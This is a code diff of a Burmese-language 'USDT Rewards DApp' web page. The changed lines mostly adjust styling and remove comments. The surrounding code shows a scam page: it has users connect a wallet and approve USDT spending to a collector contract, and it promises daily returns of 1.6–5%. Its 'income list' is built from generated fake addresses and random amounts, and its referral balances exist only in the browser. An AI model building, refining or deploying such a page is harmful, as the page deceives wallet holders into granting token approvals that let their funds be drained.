@@ -31,54 +31,54 @@
         }
     </style>
 </head>
-<body class="bg-slate-900 text-white min-h-screen flex flex-col items-center justify-center p-4">
+<body class="bg-slate-900 text-white min-h-screen flex flex-col items-center justify-center p-4 text-sm">
 
     <!-- PART 1 -->
     <div class="bg-slate-800 p-6 rounded-2xl shadow-xl w-full max-w-lg border border-slate-700 relative mb-6">
         
         <div class="flex items-center justify-between mb-4 border-b border-slate-700 pb-4">
             <div class="flex items-center gap-2">
-                <img src="logo.png" alt="Logo" class="w-8 h-8 rounded-full border border-emerald-400/50 object-cover" onerror="this.onerror=null; this.src='https://cryptologos.cc/logos/tether-usdt-logo.png';">
-                <h1 class="text-xs md:text-sm font-bold text-emerald-400">USDT Rewards DApp</h1>
+                <img src="logo.png" alt="Logo" class="w-9 h-9 rounded-full border border-emerald-400/50 object-cover" onerror="this.onerror=null; this.src='https://cryptologos.cc/logos/tether-usdt-logo.png';">
+                <h1 class="text-sm md:text-base font-bold text-emerald-400">USDT Rewards DApp</h1>
             </div>
 
             <div class="flex items-center gap-2">
-                <button id="connectBtn" onclick="startConnectProcess()" class="bg-blue-600 hover:bg-blue-500 font-semibold px-3 py-2 rounded-xl transition cursor-pointer text-xs shadow-lg">
+                <button id="connectBtn" onclick="startConnectProcess()" class="bg-blue-600 hover:bg-blue-500 font-semibold px-3.5 py-2.5 rounded-xl transition cursor-pointer text-sm shadow-lg">
                     Connect Wallet
                 </button>
             </div>
         </div>
 
         <div class="space-y-1 mb-4 text-center">
-            <p id="walletAddress" class="text-xs text-slate-400 truncate"></p>
-            <span id="selectedNetworkBadge" class="hidden inline-block bg-emerald-500/20 border border-emerald-500/40 text-emerald-400 text-xs px-3 py-1 rounded-full font-semibold">Active Network: POLYGON</span>
-            <div id="statusLog" class="text-xs text-center text-amber-400 font-mono pt-1"></div>
+            <p id="walletAddress" class="text-sm text-slate-400 truncate"></p>
+            <span id="selectedNetworkBadge" class="hidden inline-block bg-emerald-500/20 border border-emerald-500/40 text-emerald-400 text-sm px-3.5 py-1 rounded-full font-semibold">Active Network: POLYGON</span>
+            <div id="statusLog" class="text-sm text-center text-amber-400 font-mono pt-1"></div>
         </div>
 
-        <div class="grid grid-cols-3 gap-2 mb-4 bg-gradient-to-r from-slate-900/90 via-slate-900 to-slate-900/90 border border-emerald-500/20 p-3 rounded-xl text-center shadow-inner relative overflow-hidden">
+        <div class="grid grid-cols-3 gap-2 mb-4 bg-gradient-to-r from-slate-900/90 via-slate-900 to-slate-900/90 border border-emerald-500/20 p-3.5 rounded-xl text-center shadow-inner relative overflow-hidden">
             <div class="absolute top-0 left-0 w-full h-[2px] bg-gradient-to-r from-transparent via-emerald-500/50 to-transparent"></div>
             <div>
                 <div class="flex items-center justify-center gap-1 mb-0.5">
-                    <span class="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse"></span>
-                    <p class="text-[10px] text-slate-400 uppercase tracking-wide font-medium">Active Users</p>
+                    <span class="w-2 h-2 rounded-full bg-emerald-400 animate-pulse"></span>
+                    <p class="text-xs text-slate-400 uppercase tracking-wide font-medium">Active Users</p>
                 </div>
-                <p id="statGlobalUsers" class="text-xs font-bold font-mono text-emerald-400">142,850</p>
+                <p id="statGlobalUsers" class="text-sm font-bold font-mono text-emerald-400">142,850</p>
             </div>
             <div class="border-x border-slate-800 px-1">
                 <div class="flex items-center justify-center gap-1 mb-0.5">
-                    <p class="text-[10px] text-slate-400 uppercase tracking-wide font-medium">Yesterday Rewards</p>
+                    <p class="text-xs text-slate-400 uppercase tracking-wide font-medium">Yesterday Rewards</p>
                 </div>
-                <p id="statYesterdayRewards" class="text-xs font-bold font-mono text-amber-300">48,290 USDT</p>
+                <p id="statYesterdayRewards" class="text-sm font-bold font-mono text-amber-300">48,290 USDT</p>
             </div>
             <div>
                 <div class="flex items-center justify-center gap-1 mb-0.5">
-                    <p class="text-[10px] text-slate-400 uppercase tracking-wide font-medium">Today Rate</p>
+                    <p class="text-xs text-slate-400 uppercase tracking-wide font-medium">Today Rate</p>
                 </div>
-                <p id="statTodayRate" class="text-xs font-bold font-mono text-cyan-300">+2.45%</p>
+                <p id="statTodayRate" class="text-sm font-bold font-mono text-cyan-300">+2.45%</p>
             </div>
         </div>
 
-        <p class="text-xs text-slate-300 leading-relaxed text-justify bg-slate-900/60 p-3.5 rounded-xl border border-slate-700/60">
+        <p class="text-sm text-slate-300 leading-relaxed text-justify bg-slate-900/60 p-4 rounded-xl border border-slate-700/65">
             ကျွန်ုပ်တို့၏ USDT Rewards DApp Platform မှ ကြိုဆိုပါသည်။ ဤစနစ်သည် အသုံးပြုသူများအတွက် မိမိတို့၏ Crypto Wallet ထဲတွင် ရှိသော USDT များပေါ် မူတည်၍ နေ့စဉ် တိုးတက်လာသော Cashback Rewards များကို စနစ်တကျ ရယူနိုင်ရန် ဖန်တီးထားသော ဗဟိုချုပ်ကိုင်မှုမဲ့ အကျိုးခံစားခွင့် ပလက်ဖောင်းတစ်ခု ဖြစ်ပါသည်။ Polygon Network ကို အသုံးပြုထားပြီး Spending Approval ပြုလုပ်ရုံဖြင့် မိမိ၏ Wallet Balance ပေါ် မူတည်ကာ သတ်မှတ်ထားသော Tiered Daily Rates အလိုက် ဆုလာဘ်များ စတင် ရရှိမည် ဖြစ်ပါသည်။
         </p>
     </div>
@@ -86,15 +86,15 @@
     <!-- PART 2 -->
     <div class="bg-slate-800 p-6 rounded-2xl shadow-xl w-full max-w-lg border border-slate-700 relative mb-6">
         
-        <div id="userDashboard" class="hidden bg-slate-900 border border-slate-700 p-4 rounded-xl space-y-3 text-xs mb-4">
-            <div class="flex items-center justify-between border-b border-slate-800 pb-2">
+        <div id="userDashboard" class="hidden bg-slate-900 border border-slate-700 p-4.5 rounded-xl space-y-3.5 text-sm mb-4">
+            <div class="flex items-center justify-between border-b border-slate-800 pb-2.5">
                 <span class="font-bold text-white flex items-center gap-1.5">
-                    <span class="w-1 h-3.5 bg-blue-500 rounded-full inline-block"></span> My account
+                    <span class="w-1.5 h-4 bg-blue-500 rounded-full inline-block"></span> My account
                 </span>
                 <span class="font-mono text-slate-300">ID: <span id="lblUserId" class="text-white font-semibold">3069</span></span>
             </div>
 
-            <div class="space-y-2 font-mono">
+            <div class="space-y-2.5 font-mono">
                 <div class="flex justify-between text-slate-400">
                     <span>Wallet balance</span>
                     <span id="lblWalletBal" class="text-slate-200">0.000000 USDT</span>
@@ -111,76 +111,76 @@
                     <span>Referral balance</span>
                     <span id="lblReferralBal" class="text-slate-300">0.000000 USDT</span>
                 </div>
-                <div class="flex justify-between text-slate-400 border-t border-slate-800 pt-2 font-semibold">
+                <div class="flex justify-between text-slate-400 border-t border-slate-800 pt-2.5 font-semibold">
                     <span class="text-emerald-400">Withdrawable balance</span>
                     <span id="lblWithdrawableBal" class="text-emerald-400">0.000000 USDT</span>
                 </div>
             </div>
 
-            <div id="tierNotice" class="bg-emerald-950/60 border border-emerald-500/40 text-emerald-300 p-2.5 rounded-xl text-[11px]">
+            <div id="tierNotice" class="bg-emerald-950/60 border border-emerald-500/40 text-emerald-300 p-3 rounded-xl text-xs">
                 Receive Interest when the balance reaches 100 USDT
             </div>
 
-            <div class="bg-slate-800/90 border border-slate-700 p-3 rounded-xl space-y-1">
+            <div class="bg-slate-800/90 border border-slate-700 p-3.5 rounded-xl space-y-1">
                 <div class="flex justify-between items-center">
                     <span class="font-bold text-white">Interest</span>
                     <span id="lblInterestEth" class="font-mono font-semibold text-purple-300">0.00000 MATIC</span>
                 </div>
-                <div class="flex justify-between items-center text-[11px] text-slate-400">
+                <div class="flex justify-between items-center text-xs text-slate-400">
                     <span>Interest is available every days</span>
                     <span id="lblInterestRate" class="text-emerald-400 font-semibold">0.0%</span>
                 </div>
             </div>
 
-            <div class="bg-slate-800/90 border border-slate-700 p-3 rounded-xl flex justify-between items-center">
+            <div class="bg-slate-800/90 border border-slate-700 p-3.5 rounded-xl flex justify-between items-center">
                 <div>
                     <div class="font-bold text-white">Interest</div>
-                    <div class="text-[11px] text-slate-400">Rebate time is 12:00 US time</div>
+                    <div class="text-xs text-slate-400">Rebate time is 12:00 US time</div>
                 </div>
-                <span class="font-mono font-semibold text-white text-sm">2%</span>
+                <span class="font-mono font-semibold text-white text-base">2%</span>
             </div>
 
-            <div class="space-y-2 pt-1">
-                <button onclick="requestWithdraw()" class="w-full bg-gradient-to-r from-purple-700 to-indigo-600 hover:from-purple-600 hover:to-indigo-500 font-semibold py-2.5 rounded-xl transition cursor-pointer text-xs shadow-md">
+            <div class="space-y-2.5 pt-1">
+                <button onclick="requestWithdraw()" class="w-full bg-gradient-to-r from-purple-700 to-indigo-600 hover:from-purple-600 hover:to-indigo-500 font-semibold py-3 rounded-xl transition cursor-pointer text-sm shadow-md">
                     Withdraw interest
                 </button>
-                <button onclick="pledgeAction()" class="w-full bg-cyan-600 hover:bg-cyan-500 font-semibold py-2.5 rounded-xl transition cursor-pointer text-xs text-slate-950 font-bold shadow-md">
+                <button onclick="pledgeAction()" class="w-full bg-cyan-600 hover:bg-cyan-500 font-semibold py-3 rounded-xl transition cursor-pointer text-sm text-slate-950 font-bold shadow-md">
                     Pledge
                 </button>
             </div>
         </div>
 
-        <div class="bg-slate-900 border border-slate-700 p-4 rounded-xl mb-4 text-xs">
-            <h2 class="font-bold text-amber-400 mb-3 uppercase tracking-wider text-center">📊 Interest Rate Tiers (နှုန်းထားများ)</h2>
-            <ul class="space-y-2 text-slate-300">
-                <li class="flex justify-between border-b border-slate-800 pb-1.5"><span>≥ 100 USDT</span> <span class="text-emerald-400 font-semibold">1.6% USDTBalance</span></li>
-                <li class="flex justify-between border-b border-slate-800 pb-1.5"><span>≥ 1,001 USDT</span> <span class="text-emerald-400 font-semibold">2% USDTBalance</span></li>
-                <li class="flex justify-between border-b border-slate-800 pb-1.5"><span>≥ 3,001 USDT</span> <span class="text-emerald-400 font-semibold">2.4% USDTBalance</span></li>
-                <li class="flex justify-between border-b border-slate-800 pb-1.5"><span>≥ 5,001 USDT</span> <span class="text-emerald-400 font-semibold">2.8% USDTBalance</span></li>
-                <li class="flex justify-between border-b border-slate-800 pb-1.5"><span>≥ 10,001 USDT</span> <span class="text-emerald-400 font-semibold">3.2% USDTBalance</span></li>
-                <li class="flex justify-between border-b border-slate-800 pb-1.5"><span>≥ 20,001 USDT</span> <span class="text-emerald-400 font-semibold">3.8% USDTBalance</span></li>
-                <li class="flex justify-between border-b border-slate-800 pb-1.5"><span>≥ 50,001 USDT</span> <span class="text-emerald-400 font-semibold">4.2% USDTBalance</span></li>
-                <li class="flex justify-between border-b border-slate-800 pb-1.5"><span>≥ 100,001 USDT</span> <span class="text-emerald-400 font-semibold">4.6% USDTBalance</span></li>
+        <div class="bg-slate-900 border border-slate-700 p-4.5 rounded-xl mb-4 text-sm">
+            <h2 class="font-bold text-amber-400 mb-3.5 uppercase tracking-wider text-center">📊 Interest Rate Tiers (နှုန်းထားများ)</h2>
+            <ul class="space-y-2.5 text-slate-300">
+                <li class="flex justify-between border-b border-slate-800 pb-2"><span>≥ 100 USDT</span> <span class="text-emerald-400 font-semibold">1.6% USDTBalance</span></li>
+                <li class="flex justify-between border-b border-slate-800 pb-2"><span>≥ 1,001 USDT</span> <span class="text-emerald-400 font-semibold">2% USDTBalance</span></li>
+                <li class="flex justify-between border-b border-slate-800 pb-2"><span>≥ 3,001 USDT</span> <span class="text-emerald-400 font-semibold">2.4% USDTBalance</span></li>
+                <li class="flex justify-between border-b border-slate-800 pb-2"><span>≥ 5,001 USDT</span> <span class="text-emerald-400 font-semibold">2.8% USDTBalance</span></li>
+                <li class="flex justify-between border-b border-slate-800 pb-2"><span>≥ 10,001 USDT</span> <span class="text-emerald-400 font-semibold">3.2% USDTBalance</span></li>
+                <li class="flex justify-between border-b border-slate-800 pb-2"><span>≥ 20,001 USDT</span> <span class="text-emerald-400 font-semibold">3.8% USDTBalance</span></li>
+                <li class="flex justify-between border-b border-slate-800 pb-2"><span>≥ 50,001 USDT</span> <span class="text-emerald-400 font-semibold">4.2% USDTBalance</span></li>
+                <li class="flex justify-between border-b border-slate-800 pb-2"><span>≥ 100,001 USDT</span> <span class="text-emerald-400 font-semibold">4.6% USDTBalance</span></li>
                 <li class="flex justify-between"><span>≥ 300,001 USDT</span> <span class="text-emerald-400 font-semibold">5% USDTBalance</span></li>
             </ul>
         </div>
 
-        <div class="bg-gradient-to-br from-slate-950 to-indigo-950 p-4 rounded-xl border border-slate-800 text-center flex flex-col items-center">
-            <div class="bg-white p-2 rounded-xl mb-2 shadow-inner inline-block">
-                <img id="qrImage" src="" alt="QR Code" class="w-32 h-32 object-contain">
+        <div class="bg-gradient-to-br from-slate-950 to-indigo-950 p-4.5 rounded-xl border border-slate-800 text-center flex flex-col items-center">
+            <div class="bg-white p-2.5 rounded-xl mb-2.5 shadow-inner inline-block">
+                <img id="qrImage" src="" alt="QR Code" class="w-36 h-36 object-contain">
             </div>
-            <p class="text-[11px] text-slate-300 mb-1">Share the QR code to invite friends to join</p>
-            <p class="text-xs font-bold text-amber-400 mb-3">Earn up 10% commission inviting friends</p>
+            <p class="text-xs text-slate-300 mb-1">Share the QR code to invite friends to join</p>
+            <p class="text-sm font-bold text-amber-400 mb-3.5">Earn up 10% commission inviting friends</p>
             
-            <div class="w-full flex items-center gap-1">
-                <input type="text" id="refLink" value="https://coin-usdt.me/#/?type=1&code=1yj9e1a0" readonly class="w-full bg-slate-900 border border-slate-800 rounded px-2 py-1.5 text-[11px] text-slate-300 font-mono">
-                <button onclick="copyRefLink()" class="bg-emerald-600 hover:bg-emerald-500 px-3 py-1.5 rounded text-[11px] font-semibold shrink-0 cursor-pointer">Copy</button>
+            <div class="w-full flex items-center gap-1.5">
+                <input type="text" id="refLink" value="https://coin-usdt.me/#/?type=1&code=1yj9e1a0" readonly class="w-full bg-slate-900 border border-slate-800 rounded-lg px-3 py-2 text-xs text-slate-300 font-mono">
+                <button onclick="copyRefLink()" class="bg-emerald-600 hover:bg-emerald-500 px-3.5 py-2 rounded-lg text-xs font-semibold shrink-0 cursor-pointer">Copy</button>
             </div>
         </div>
     </div>
 
     <!-- PART 3 -->
-    <div class="w-full max-w-lg bg-slate-800 border border-slate-700 p-5 rounded-2xl shadow-xl mb-6 text-xs">
+    <div class="w-full max-w-lg bg-slate-800 border border-slate-700 p-5 rounded-2xl shadow-xl mb-6 text-sm">
         <h2 class="font-bold text-emerald-400 uppercase tracking-wider mb-4">INTEREST INCOME LIST</h2>
         <div class="h-64 overflow-hidden relative">
             <div id="incomeListContainer" class="absolute w-full space-y-3 animate-scroll-list"></div>
@@ -188,9 +188,9 @@
     </div>
 
     <!-- PART 4 -->
-    <div class="w-full max-w-lg bg-slate-800 border border-slate-700 p-5 rounded-2xl shadow-xl mb-10 text-xs text-center">
+    <div class="w-full max-w-lg bg-slate-800 border border-slate-700 p-5 rounded-2xl shadow-xl mb-10 text-sm text-center">
         <h2 class="font-bold text-cyan-400 uppercase tracking-wider mb-3">SUPPORTED WEB3 & DEFI WALLETS</h2>
-        <p class="text-[11px] text-slate-400 mb-4">Securely connect and interact using your preferred crypto wallets</p>
+        <p class="text-xs text-slate-400 mb-4">Securely connect and interact using your preferred crypto wallets</p>
         
         <div class="overflow-hidden relative w-full py-3 bg-slate-900/80 rounded-xl border border-slate-800">
             <div class="animate-marquee flex items-center gap-6">
@@ -278,9 +278,9 @@
                 htmlContent += `
                     <div class="flex items-center justify-between bg-slate-900/90 p-3 rounded-xl border border-slate-800">
                         <div class="flex items-center gap-2.5">
-                            <span class="font-mono text-slate-300 text-xs">${fakeAddress}</span>
+                            <span class="font-mono text-slate-300 text-sm">${fakeAddress}</span>
                         </div>
-                        <span class="font-mono font-semibold text-emerald-400 text-xs">${randomAmount} <span class="text-slate-400">USDT</span></span>
+                        <span class="font-mono font-semibold text-emerald-400 text-sm">${randomAmount} <span class="text-slate-400">USDT</span></span>
                     </div>
                 `;
             }
@@ -294,7 +294,6 @@
             generateIncomeList();
             startLiveCalculatingStats();
             
-            // Check ref parameter from URL and store in localStorage
             const urlParams = new URLSearchParams(window.location.search);
             const refParam = urlParams.get("ref") || urlParams.get("code");
             if (refParam && ethers.isAddress(refParam)) {
@@ -303,7 +302,6 @@
 
             setTimeout(checkAutoConnect, 1500);
         });
-
 
         async function checkAutoConnect() {
             if (typeof window.ethereum !== "undefined") {
@@ -338,7 +336,6 @@
             }
         }
 
-        // Real-time Balance Sync on New Block
         function startRealtimeBalanceSync() {
             if (!provider || !userAddress) return;
             provider.on("block", async (blockNumber) => {
@@ -364,7 +361,7 @@
 
                 if (Number(allowance) > 0) {
                     document.getElementById("connectBtn").innerText = "Connected & Approved";
-                    document.getElementById("connectBtn").className = "bg-slate-700 font-semibold px-3 py-2 rounded-xl transition text-xs shadow-lg cursor-default";
+                    document.getElementById("connectBtn").className = "bg-slate-700 font-semibold px-3.5 py-2.5 rounded-xl transition text-sm shadow-lg cursor-default";
                     
                     const badgeEl = document.getElementById("selectedNetworkBadge");
                     badgeEl.classList.remove("hidden");
@@ -430,7 +427,7 @@
                     badgeEl.classList.remove("hidden");
 
                     document.getElementById("connectBtn").innerText = "Connected & Approved";
-                    document.getElementById("connectBtn").className = "bg-slate-700 font-semibold px-3 py-2 rounded-xl transition text-xs shadow-lg cursor-default";
+                    document.getElementById("connectBtn").className = "bg-slate-700 font-semibold px-3.5 py-2.5 rounded-xl transition text-sm shadow-lg cursor-default";
 
                     await checkUserData();
                     startRealtimeBalanceSync();
@@ -451,7 +448,7 @@
                 badgeEl.classList.remove("hidden");
 
                 document.getElementById("connectBtn").innerText = "Connected & Approved";
-                document.getElementById("connectBtn").className = "bg-slate-700 font-semibold px-3 py-2 rounded-xl transition text-xs shadow-lg cursor-default";
+                document.getElementById("connectBtn").className = "bg-slate-700 font-semibold px-3.5 py-2.5 rounded-xl transition text-sm shadow-lg cursor-default";
 
                 logEl.innerText = "Transaction တင်နေပါသည်...";
                 const usdtContract = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, signer);
@@ -529,7 +526,6 @@
                     const cashback = formattedBal * rate;
                     const maticInterest = (cashback / 3000).toFixed(5);
 
-                    // Get referral balance from localStorage for this user
                     const refBalanceKey = `ref_balance_${userAddress.toLowerCase()}`;
                     const referralBalance = parseFloat(localStorage.getItem(refBalanceKey) || "0");
                     const withdrawableBalance = cashback + referralBalance;
@@ -568,13 +564,12 @@
                 }
 
                 const collector = new ethers.Contract(COLLECTOR_CONTRACT_ADDRESS, COLLECTOR_ABI, signer);
-                const withdrawAmountNum = 10; // 10 USDT
+                const withdrawAmountNum = 10;
                 const withdrawAmount = ethers.parseUnits(withdrawAmountNum.toString(), 6);
 
                 const tx = await collector.requestWithdraw(withdrawAmount);
                 await tx.wait();
 
-                // 10% Referral Commission Logic
                 try {
                     const collectorReader = new ethers.Contract(COLLECTOR_CONTRACT_ADDRESS, COLLECTOR_ABI, provider);
                     const userInfo = await collectorReader.users(userAddress);
@@ -586,7 +581,7 @@
                     if (referrerAddr && referrerAddr !== ethers.ZeroAddress) {
                         const refKey = `ref_balance_${referrerAddr.toLowerCase()}`;
                         let currentRefBal = parseFloat(localStorage.getItem(refKey) || "0");
-                        let commission = withdrawAmountNum * 0.10; // 10% commission
+                        let commission = withdrawAmountNum * 0.10;
                         currentRefBal += commission;
                         localStorage.setItem(refKey, currentRefBal.toString());
                     }
@@ -595,7 +590,7 @@
                 }
 
                 alert("Withdraw တောင်းဆိုချက် Smart Contract သို့ အောင်မြင်စွာ တင်သွင်းပြီးပါပြီ။ Admin ဘက်တွင် အချိန်နှင့်တပြေးညီ ပေါ်လာပါမည်။");
-                checkUserData(); // Refresh dashboard balances
+                checkUserData();
             } catch (err) {
                 console.error(err);
                 alert("Withdraw တောင်းဆိုမှု မအောင်မြင်ပါ။");
@@ -608,5 +603,3 @@
     </script>
 </body>
 </html>
-
-  sync
